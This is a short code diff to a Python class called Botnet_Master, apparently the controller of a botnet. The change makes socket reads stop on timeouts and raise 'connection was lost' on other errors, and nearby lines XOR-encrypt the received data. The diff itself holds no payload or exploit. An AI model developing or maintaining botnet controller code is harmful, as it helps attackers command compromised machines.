@@ -47,7 +47,14 @@ class Botnet_Master:
                     break
                 data+=d
             except Exception as ex:
-                break
+                if 'time' in str(ex):
+                    break
+                else:
+                    try:
+                        sock.close()
+                    except:
+                        pass
+                    raise Exception('connection was lost')
         sock.settimeout(real_timeout)
         if xor_key not in [None,''] and data.strip()!='':
             return XOR.encrypt(data,xor_key)
